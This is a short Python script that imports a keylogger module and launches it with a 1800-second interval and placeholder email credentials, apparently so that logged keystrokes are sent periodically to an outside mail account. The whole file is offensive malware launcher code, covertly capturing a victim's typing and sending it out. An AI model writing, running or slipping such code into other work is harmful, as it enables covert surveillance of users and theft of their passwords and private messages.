#!/usr/bin/env python
import keylogger

new_keylogger = keylogger.Keylogger(1800, "user@gmail.com", "password")
new_keylogger.start()